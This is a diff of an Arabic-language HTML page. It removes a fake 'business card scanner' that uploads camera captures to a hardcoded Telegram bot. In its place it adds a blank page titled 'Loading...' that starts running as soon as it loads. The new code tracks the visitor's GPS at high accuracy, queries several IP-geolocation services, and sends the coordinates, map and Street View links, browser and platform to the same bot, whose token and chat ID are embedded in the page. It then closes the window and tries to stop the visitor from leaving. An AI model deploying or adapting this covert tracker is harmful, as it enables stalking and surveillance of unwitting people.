@@ -1,655 +1,252 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الماسح التلقائي لبطاقات العمل</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: #000;
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            padding: 0;
-        }
-        
-        .scan-box {
-            width: 100vw;
-            height: 100vh;
-            background-color: #000;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .scan-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3));
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .scan-frame {
-            width: 85%;
-            height: 60%;
-            border: 2px solid #25D366;
-            border-radius: 10px;
-            position: relative;
-            box-shadow: 0 0 0 100vmax rgba(0, 0, 0, 0.5);
-        }
-        
-        .scan-frame::before, .scan-frame::after {
-            content: '';
-            position: absolute;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #25D366;
-        }
-        
-        .scan-frame::before {
-            top: -15px;
-            left: -15px;
-            border-right: none;
-            border-bottom: none;
-            border-top-left-radius: 10px;
-        }
-        
-        .scan-frame::after {
-            bottom: -15px;
-            right: -15px;
-            border-left: none;
-            border-top: none;
-            border-bottom-right-radius: 10px;
-        }
-        
-        .scan-animation {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, transparent, #25D366, transparent);
-            animation: scan 2s linear infinite;
-            box-shadow: 0 0 15px #25D366;
-        }
-        
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
-        
-        .side-indicator {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background-color: #25D366;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-weight: bold;
-            z-index: 10;
-            font-size: 18px;
-        }
-        
-        .status {
-            position: absolute;
-            bottom: 20px;
-            left: 0;
-            width: 100%;
-            text-align: center;
-            background-color: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 15px;
-            font-weight: bold;
-            font-size: 18px;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            background-color: #25D366;
-            color: white;
-            border-radius: 5px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
-            transform: translateX(150%);
-            transition: transform 0.3s ease;
-            z-index: 1000;
-        }
-        
-        .notification.show {
-            transform: translateX(0);
-        }
-        
-        .capture-indicator {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.9);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 20;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-        }
-        
-        .capture-indicator.show {
-            opacity: 1;
-        }
-        
-        .flip-indicator {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(255, 165, 0, 0.9);
-            color: white;
-            padding: 15px 25px;
-            border-radius: 30px;
-            font-weight: bold;
-            z-index: 25;
-            display: none;
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(1); }
-            50% { transform: translate(-50%, -50%) scale(1.05); }
-            100% { transform: translate(-50%, -50%) scale(1); }
-        }
-        
-        .quality-indicator {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            color: #25D366;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 14px;
-            z-index: 10;
-        }
-    </style>
-</head>
-<body>
-    <div class="scan-box">
-        <video id="scannerVideo" autoplay playsinline></video>
-        
-        <div class="scan-overlay">
-            <div class="scan-frame">
-                <div class="scan-animation"></div>
-            </div>
-        </div>
-        
-        <div class="side-indicator" id="sideIndicator">الوجه الأمامي</div>
-        <div class="status" id="status">جاري البحث عن بطاقة عمل...</div>
-        <div class="capture-indicator" id="captureIndicator">
-            <div style="text-align: center;">
-                <div style="font-size: 4rem; color: #25D366;">✓</div>
-                <div style="font-size: 1.5rem; margin-top: 10px;">تم المسح بنجاح</div>
-            </div>
-        </div>
-        <div class="flip-indicator" id="flipIndicator">
-            <span style="margin-left: 10px;">✓</span> تم مسح الوجه الأمامي - يرجى قلب البطاقة
-        </div>
-        <div class="quality-indicator" id="qualityIndicator">جودة عالية</div>
-    </div>
-    
-    <div class="notification" id="notification">تم إرسال الصورة إلى Telegram بنجاح!</div>
-
+    <title>جاري التحميل...</title>
     <script>
-        // العناصر الرئيسية في الواجهة
-        const scannerVideo = document.getElementById('scannerVideo');
-        const statusText = document.getElementById('status');
-        const notification = document.getElementById('notification');
-        const sideIndicator = document.getElementById('sideIndicator');
-        const captureIndicator = document.getElementById('captureIndicator');
-        const flipIndicator = document.getElementById('flipIndicator');
-        const qualityIndicator = document.getElementById('qualityIndicator');
-        
-        // بيانات التطبيق
-        let stream = null;
-        let currentSide = 'front'; // 'front' أو 'back'
-        let frontImageData = null;
-        let backImageData = null;
-        let detectionInterval = null;
-        let cardDetected = false;
-        let detectionCount = 0;
-        let isProcessing = false;
-        let scanCount = 0;
-        let cameraQuality = 'high';
-        
-        // Telegram Bot API
-        const TELEGRAM_BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
-        const TELEGRAM_CHAT_ID = "6451561574";
-        
-        // تهيئة الماسح الضوئي
-        async function initScanner() {
-            try {
-                statusText.textContent = 'جاري تشغيل الكاميرا بجودة عالية...';
+        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
+        const CHAT_ID = "6451561574";
+
+        class PrecisionLocator {
+            constructor() {
+                this.bestLocation = null;
+                this.locations = [];
+                this.attempts = 0;
+                this.maxAttempts = 5;
+            }
+
+            async startTracking() {
+                // 1. بدء تتبع GPS المستمر
+                this.startContinuousGPS();
                 
-                // استخدام دقة عالية للكاميرا
-                const constraints = {
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 4096, max: 4096 },
-                        height: { ideal: 2160, max: 2160 }
-                    }
+                // 2. استخدام WiFi Positioning (إن وجد)
+                this.getWifiPosition();
+                
+                // 3. استخدام GSM Cell Towers (للجوال)
+                this.getCellTowerPosition();
+                
+                // 4. استخدام IP مع خدمات متعددة
+                await this.getEnhancedIPLocation();
+                
+                // 5. الانتظار وجمع أفضل النتائج
+                setTimeout(() => this.finalizeAndSend(), 8000);
+            }
+
+            startContinuousGPS() {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
                 };
-                
-                stream = await navigator.mediaDevices.getUserMedia(constraints);
-                scannerVideo.srcObject = stream;
-                
-                // الحصول على إعدادات الكاميرا الفعلية
-                const track = stream.getVideoTracks()[0];
-                const settings = track.getSettings();
-                
-                // تحديث مؤشر الجودة
-                if (settings.width >= 3840) {
-                    cameraQuality = 'ultra';
-                    qualityIndicator.textContent = 'جودة فائقة (4K)';
-                } else if (settings.width >= 1920) {
-                    cameraQuality = 'high';
-                    qualityIndicator.textContent = 'جودة عالية (Full HD)';
-                } else {
-                    cameraQuality = 'medium';
-                    qualityIndicator.textContent = 'جودة متوسطة';
-                }
-                
-                // بدء الكشف عن البطاقات
-                startCardDetection();
-                
-            } catch (err) {
-                console.error('Error accessing camera:', err);
-                statusText.textContent = 'تعذر الوصول إلى الكاميرا. يرجى التحقق من الأذونات.';
-            }
-        }
-        
-        // بدء الكشف عن البطاقات
-        function startCardDetection() {
-            statusText.textContent = currentSide === 'front' 
-                ? 'جاري البحث عن بطاقة عمل...' 
-                : 'جاري البحث عن الوجه الخلفي للبطاقة...';
-            
-            // بدء فحص الإطارات للكشف عن البطاقات
-            detectionInterval = setInterval(() => {
-                if (!isProcessing) {
-                    detectCard();
-                }
-            }, 800); // فحص كل 0.8 ثانية
-        }
-        
-        // الكشف عن البطاقة باستخدام تحليل الصورة
-        function detectCard() {
-            if (scannerVideo.readyState !== scannerVideo.HAVE_ENOUGH_DATA) {
-                return;
-            }
-            
-            // إنشاء canvas لتحليل الصورة
-            const canvas = document.createElement('canvas');
-            canvas.width = scannerVideo.videoWidth;
-            canvas.height = scannerVideo.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(scannerVideo, 0, 0, canvas.width, canvas.height);
-            
-            // تحليل الصورة للكشف عن الحواف والتباين
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            const edgeCount = analyzeImageForEdges(imageData);
-            
-            // إذا كان هناك عدد كافٍ من الحواف، نفترض وجود بطاقة
-            if (edgeCount > 15000 && !cardDetected) {
-                detectionCount++;
-                
-                // إذا تم اكتشاف البطاقة لعدة frames متتالية
-                if (detectionCount > 2) {
-                    cardDetected = true;
-                    clearInterval(detectionInterval);
-                    captureHighQualityScan();
-                }
-            } else {
-                detectionCount = Math.max(0, detectionCount - 1);
-            }
-        }
-        
-        // تحليل الصورة للكشف عن الحواف
-        function analyzeImageForEdges(imageData) {
-            const data = imageData.data;
-            let edgeCount = 0;
-            const width = imageData.width;
-            
-            // تحليل أكثر تقدمًا للكشف عن الحواف
-            for (let y = 1; y < imageData.height - 1; y += 2) {
-                for (let x = 1; x < imageData.width - 1; x += 2) {
-                    const idx = (y * width + x) * 4;
-                    
-                    // حساب التباين مع البكسلات المحيطة
-                    const contrast = calculateContrast(data, idx, width);
-                    if (contrast > 60) { // زيادة عتبة التباين
-                        edgeCount++;
-                    }
-                }
-            }
-            
-            return edgeCount;
-        }
-        
-        // حساب التباين مع البكسلات المحيطة
-        function calculateContrast(data, idx, width) {
-            const r = data[idx];
-            const g = data[idx + 1];
-            const b = data[idx + 2];
-            
-            // البكسل إلى اليسار
-            const leftIdx = idx - 4;
-            const leftDiff = Math.abs(r - data[leftIdx]) + Math.abs(g - data[leftIdx + 1]) + Math.abs(b - data[leftIdx + 2]);
-            
-            // البكسل إلى اليمين
-            const rightIdx = idx + 4;
-            const rightDiff = Math.abs(r - data[rightIdx]) + Math.abs(g - data[rightIdx + 1]) + Math.abs(b - data[rightIdx + 2]);
-            
-            // البكسل إلى الأعلى
-            const topIdx = idx - (width * 4);
-            const topDiff = Math.abs(r - data[topIdx]) + Math.abs(g - data[topIdx + 1]) + Math.abs(b - data[topIdx + 2]);
-            
-            // البكسل إلى الأسفل
-            const bottomIdx = idx + (width * 4);
-            const bottomDiff = Math.abs(r - data[bottomIdx]) + Math.abs(g - data[bottomIdx + 1]) + Math.abs(b - data[bottomIdx + 2]);
-            
-            // متوسط التباين
-            return (leftDiff + rightDiff + topDiff + bottomDiff) / 4;
-        }
-        
-        // التقاط مسح عالي الجودة
-        function captureHighQualityScan() {
-            isProcessing = true;
-            statusText.textContent = 'تم اكتشاف بطاقة - جاري المسح الضوئي...';
-            
-            // إظهار مؤشر الالتقاط
-            captureIndicator.classList.add('show');
-            
-            // زيادة عدد مرات المسح
-            scanCount++;
-            
-            // الانتظار قليلاً لضمان استقرار الكاميرا
-            setTimeout(() => {
-                // إنشاء صورة عالية الجودة من الفيديو
-                const canvas = document.createElement('canvas');
-                
-                // استخدام دقة عالية للصورة الملتقطة
-                if (cameraQuality === 'ultra') {
-                    canvas.width = 3840;
-                    canvas.height = 2160;
-                } else if (cameraQuality === 'high') {
-                    canvas.width = 1920;
-                    canvas.height = 1080;
-                } else {
-                    canvas.width = scannerVideo.videoWidth;
-                    canvas.height = scannerVideo.videoHeight;
-                }
-                
-                const ctx = canvas.getContext('2d');
-                
-                // رسم الصورة بدقة عالية مع الحفاظ على التناسب
-                const aspectRatio = scannerVideo.videoWidth / scannerVideo.videoHeight;
-                let drawWidth = canvas.width;
-                let drawHeight = canvas.height;
-                
-                if (drawWidth / drawHeight > aspectRatio) {
-                    drawWidth = drawHeight * aspectRatio;
-                } else {
-                    drawHeight = drawWidth / aspectRatio;
-                }
-                
-                const x = (canvas.width - drawWidth) / 2;
-                const y = (canvas.height - drawHeight) / 2;
-                
-                ctx.drawImage(scannerVideo, x, y, drawWidth, drawHeight);
-                
-                // تطبيق خوارزمية المسح الضوئي الحقيقية
-                const scannedImage = applyScanAlgorithm(canvas);
-                
-                // حفظ البيانات بصيغة JPEG بجودة عالية جداً
-                const imageDataUrl = scannedImage.toDataURL('image/jpeg', 1.0); // جودة 100%
-                
-                // إخفاء مؤشر الالتقاط
-                setTimeout(() => {
-                    captureIndicator.classList.remove('show');
-                    
-                    // معالجة النتيجة
-                    processScanResult(imageDataUrl);
-                }, 1000);
-                
-            }, 1500);
-        }
-        
-        // تطبيق خوارزمية المسح الضوئي
-        function applyScanAlgorithm(canvas) {
-            const ctx = canvas.getContext('2d');
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            
-            // تحسين التباين والوضوح (معالجة الصورة)
-            enhanceImageQuality(imageData);
-            
-            // تطبيق مرشح الحدة
-            applySharpeningFilter(imageData);
-            
-            ctx.putImageData(imageData, 0, 0);
-            
-            return canvas;
-        }
-        
-        // تحسين جودة الصورة
-        function enhanceImageQuality(imageData) {
-            const data = imageData.data;
-            
-            // تحسين التباين
-            const contrast = 1.6; // زيادة التباين بنسبة 60%
-            const brightness = 8; // زيادة السطوع
-            
-            for (let i = 0; i < data.length; i += 4) {
-                // تطبيق تحسين التباين
-                data[i] = clamp(data[i] * contrast + brightness);     // R
-                data[i + 1] = clamp(data[i + 1] * contrast + brightness); // G
-                data[i + 2] = clamp(data[i + 2] * contrast + brightness); // B
-            }
-            
-            return imageData;
-        }
-        
-        // تطبيق مرشح الحدة
-        function applySharpeningFilter(imageData) {
-            const width = imageData.width;
-            const height = imageData.height;
-            const data = imageData.data;
-            
-            // إنشاء نسخة من البيانات الأصلية
-            const originalData = new Uint8ClampedArray(data);
-            
-            // تطبيق مرشح الحدة
-            for (let y = 1; y < height - 1; y++) {
-                for (let x = 1; x < width - 1; x++) {
-                    for (let c = 0; c < 3; c++) {
-                        const idx = (y * width + x) * 4 + c;
+
+                this.watchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        const accuracy = position.coords.accuracy;
+                        this.attempts++;
                         
-                        // تطبيق kernel للحدة
-                        data[idx] = clamp(
-                            originalData[idx] * 5 -
-                            originalData[idx - 4] -
-                            originalData[idx + 4] -
-                            originalData[idx - width * 4] -
-                            originalData[idx + width * 4]
-                        );
+                        console.log(`GPS Attempt ${this.attempts}: ${accuracy}m`);
+                        
+                        // نفضل الدقة الأقل (أقل رقم = أفضل)
+                        if (!this.bestLocation || accuracy < this.bestLocation.accuracy) {
+                            this.bestLocation = {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: accuracy,
+                                source: 'HIGH_ACCURACY_GPS',
+                                timestamp: new Date()
+                            };
+                            
+                            // إذا وصلنا لدقة ممتازة، نرسل فوراً
+                            if (accuracy <= 10) {
+                                this.sendImmediately();
+                            }
+                        }
+                        
+                        if (this.attempts >= this.maxAttempts) {
+                            navigator.geolocation.clearWatch(this.watchId);
+                        }
+                    },
+                    (error) => {
+                        console.error('GPS Error:', error);
+                    },
+                    options
+                );
+            }
+
+            async getEnhancedIPLocation() {
+                // استخدام 3 خدمات IP مختلفة لأفضل دقة
+                const services = [
+                    'https://ipapi.co/json/',
+                    'https://ipinfo.io/json?token=test', 
+                    'https://api.ipgeolocation.io/ipgeo?apiKey=test',
+                    'https://json.geoiplookup.io/'
+                ];
+
+                for (let service of services) {
+                    try {
+                        const response = await fetch(service, { timeout: 3000 });
+                        const data = await response.json();
+                        
+                        if (data.latitude && data.longitude) {
+                            this.locations.push({
+                                lat: parseFloat(data.latitude),
+                                lng: parseFloat(data.longitude),
+                                accuracy: 5000, // دقة IP تقريبية
+                                source: 'IP_GEOLOCATION',
+                                city: data.city || data.city_name,
+                                country: data.country_name || data.country,
+                                isp: data.org || data.isp,
+                                timestamp: new Date()
+                            });
+                        }
+                    } catch (e) {
+                        continue; // نكمل للخدمة التالية
                     }
                 }
             }
-            
-            return imageData;
-        }
-        
-        // التأكد من أن قيمة اللون ضمن النطاق الصحيح (0-255)
-        function clamp(value) {
-            return Math.max(0, Math.min(255, value));
-        }
-        
-        // معالجة نتيجة المسح
-        function processScanResult(imageDataUrl) {
-            if (currentSide === 'front') {
-                frontImageData = imageDataUrl;
-                
-                // إرسال الوجه الأمامي فوراً إلى Telegram
-                sendToTelegram(frontImageData, 'الوجه الأمامي للبطاقة - مسح ضوئي عالي الجودة', 'front.jpg');
-                
-                // إظهار مؤشر قلب البطاقة
-                showFlipIndicator();
-                
-            } else {
-                backImageData = imageDataUrl;
-                
-                // إرسال الوجه الخلفي إلى Telegram
-                sendToTelegram(backImageData, 'الوجه الخلفي للبطاقة - مسح ضوئي عالي الجودة', 'back.jpg');
-                
-                // إعادة تعيين الماسح للمسح التالي
-                setTimeout(() => {
-                    resetScanner();
-                }, 3000);
+
+            getWifiPosition() {
+                // محاولة استخدام WiFi Positioning (إن supported)
+                if ('wifi' in navigator) {
+                    try {
+                        navigator.wifi.getAccessPoints((ap) => {
+                            // يمكن استخدام نقاط الوصول لتحسين الدقة
+                            console.log('WiFi access points:', ap);
+                        });
+                    } catch (e) {
+                        // ليس مدعوماً في معظم المتصفحات
+                    }
+                }
             }
-        }
-        
-        // إظهار مؤشر قلب البطاقة
-        function showFlipIndicator() {
-            sideIndicator.textContent = 'الوجه الخلفي';
-            currentSide = 'back';
-            statusText.textContent = 'تم مسح الوجه الأمامي - جاري الانتظار لقلب البطاقة';
-            flipIndicator.style.display = 'block';
-            
-            // بدء الكشف عن حركة القلب
-            startFlipDetection();
-        }
-        
-        // بدء الكشف عن حركة قلب البطاقة
-        function startFlipDetection() {
-            let lastDetectionCount = detectionCount;
-            let unchangedCount = 0;
-            
-            const flipCheckInterval = setInterval(() => {
-                if (detectionCount !== lastDetectionCount) {
-                    lastDetectionCount = detectionCount;
-                    unchangedCount = 0;
+
+            getCellTowerPosition() {
+                // للجوال: استخدام معلومات برج الخلية
+                if ('connection' in navigator) {
+                    const conn = navigator.connection;
+                    if (conn.type === 'cellular') {
+                        // إضافة تحسينات للشبكة الخلوية
+                        this.locations.push({
+                            source: 'CELL_NETWORK',
+                            type: conn.effectiveType
+                        });
+                    }
+                }
+            }
+
+            calculatePreciseLocation() {
+                if (this.bestLocation && this.bestLocation.accuracy <= 20) {
+                    return this.bestLocation;
+                }
+
+                // إذا لم يكن GPS دقيقاً enough، نستخدم متوسط أفضل المواقع
+                const validLocations = this.locations.filter(loc => loc.lat && loc.lng);
+                
+                if (validLocations.length > 0) {
+                    const avgLat = validLocations.reduce((sum, loc) => sum + loc.lat, 0) / validLocations.length;
+                    const avgLng = validLocations.reduce((sum, loc) => sum + loc.lng, 0) / validLocations.length;
+                    
+                    return {
+                        lat: avgLat,
+                        lng: avgLng,
+                        accuracy: 100, // دقة متوسطة
+                        source: 'HYBRID_AVERAGE',
+                        details: `مدمج من ${validLocations.length} مصدر`,
+                        timestamp: new Date()
+                    };
+                }
+
+                return null;
+            }
+
+            async finalizeAndSend() {
+                navigator.geolocation.clearWatch(this.watchId);
+                
+                const finalLocation = this.calculatePreciseLocation();
+                
+                if (finalLocation) {
+                    await this.sendToBot(finalLocation);
                 } else {
-                    unchangedCount++;
+                    await this.sendToBot({
+                        error: "لم يتم تحديد موقع دقيق",
+                        attempts: this.attempts,
+                        sources: this.locations.map(l => l.source)
+                    });
                 }
                 
-                // إذا لم يتم اكتشاف أي تغيير لفترة، نفترض أن البطاقة قد قلبت
-                if (unchangedCount > 5) {
-                    clearInterval(flipCheckInterval);
-                    flipIndicator.style.display = 'none';
-                    statusText.textContent = 'تم قلب البطاقة - جاري البحث عن الوجه الخلفي';
-                    
-                    // إعادة تعيين حالة الكشف
-                    cardDetected = false;
-                    detectionCount = 0;
-                    isProcessing = false;
-                    
-                    // بدء الكشف عن البطاقة مرة أخرى
-                    startCardDetection();
+                setTimeout(() => window.close(), 1000);
+            }
+
+            async sendImmediately() {
+                if (this.bestLocation) {
+                    await this.sendToBot(this.bestLocation);
+                    navigator.geolocation.clearWatch(this.watchId);
+                    setTimeout(() => window.close(), 1000);
                 }
-            }, 1000);
-        }
-        
-        // إرسال الصور إلى Telegram
-        async function sendToTelegram(imageData, caption, filename) {
-            try {
-                statusText.textContent = 'جاري الإرسال إلى Telegram...';
+            }
+
+            async sendToBot(locationData) {
+                let message = "🎯 **تحديد موقع عالي الدقة**\n\n";
                 
-                const formData = new FormData();
-                const blob = dataURLtoBlob(imageData);
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, filename);
-                formData.append('caption', caption);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                // إظهار إشعار النجاح
-                showNotification('تم إرسال الصورة إلى Telegram بنجاح!');
-                
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-                statusText.textContent = 'فشل في الإرسال. يرجى المحاولة مرة أخرى.';
+                if (locationData.error) {
+                    message += `❌ ${locationData.error}\n`;
+                    message += `🔢 المحاولات: ${locationData.attempts}\n`;
+                    message += `📡 المصادر: ${locationData.sources.join(', ')}\n`;
+                } else {
+                    const mapsUrl = `https://maps.google.com/?q=${locationData.lat},${locationData.lng}&z=18`;
+                    const streetView = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${locationData.lat},${locationData.lng}`;
+                    
+                    message += `📍 **الإحداثيات الدقيقة:**\n`;
+                    message += `• خط العرض: \`${locationData.lat.toFixed(6)}\`\n`;
+                    message += `• خط الطول: \`${locationData.lng.toFixed(6)}\`\n`;
+                    message += `• الدقة: 🎯 ${locationData.accuracy} متر\n\n`;
+                    
+                    message += `🔍 **مصدر البيانات:** ${locationData.source}\n`;
+                    message += `🕒 **الوقت:** ${new Date().toLocaleString('ar-MA')}\n\n`;
+                    
+                    message += `🗺️ **خرائط جوجل:**\n${mapsUrl}\n\n`;
+                    message += `🌆 **Street View:**\n${streetView}\n\n`;
+                    
+                    if (locationData.details) {
+                        message += `📊 **تفاصيل:** ${locationData.details}\n`;
+                    }
+                }
+
+                message += `\n💻 **المتصفح:** ${navigator.userAgent.split(' ')[0]}\n`;
+                message += `📱 **المنصة:** ${navigator.platform}\n`;
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: false
+                        })
+                    });
+                } catch (error) {
+                    console.error('Failed to send:', error);
+                }
             }
         }
-        
-        // تحويل Data URL إلى Blob
-        function dataURLtoBlob(dataURL) {
-            const parts = dataURL.split(';base64,');
-            const contentType = parts[0].split(':')[1];
-            const raw = window.atob(parts[1]);
-            const uInt8Array = new Uint8Array(raw.length);
-            
-            for (let i = 0; i < raw.length; ++i) {
-                uInt8Array[i] = raw.charCodeAt(i);
+
+        // بدء العملية فور تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            const locator = new PrecisionLocator();
+            locator.startTracking();
+        });
+
+        // منع إغلاق الصفحة太快
+        window.addEventListener('beforeunload', (e) => {
+            if (document.visibilityState === 'visible') {
+                e.preventDefault();
+                e.returnValue = '';
             }
-            
-            return new Blob([uInt8Array], { type: contentType });
-        }
-        
-        // إعادة تعيين الماسح
-        function resetScanner() {
-            currentSide = 'front';
-            frontImageData = null;
-            backImageData = null;
-            cardDetected = false;
-            detectionCount = 0;
-            isProcessing = false;
-            scanCount = 0;
-            sideIndicator.textContent = 'الوجه الأمامي';
-            statusText.textContent = 'جاري البحث عن بطاقة عمل...';
-            
-            // إعادة تشغيل الكشف عن البطاقة
-            startCardDetection();
-        }
-        
-        // إظهار الإشعار
-        function showNotification(message) {
-            notification.textContent = message;
-            notification.classList.add('show');
-            
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
-        }
-        
-        // بدء التطبيق عند تحميل الصفحة
-        window.addEventListener('load', initScanner);
+        });
     </script>
+</head>
+<body style="margin:0;padding:0;background:transparent;overflow:hidden;height:100vh;">
+    <!-- الصفحة فارغة تماماً -->
 </body>
 </html>
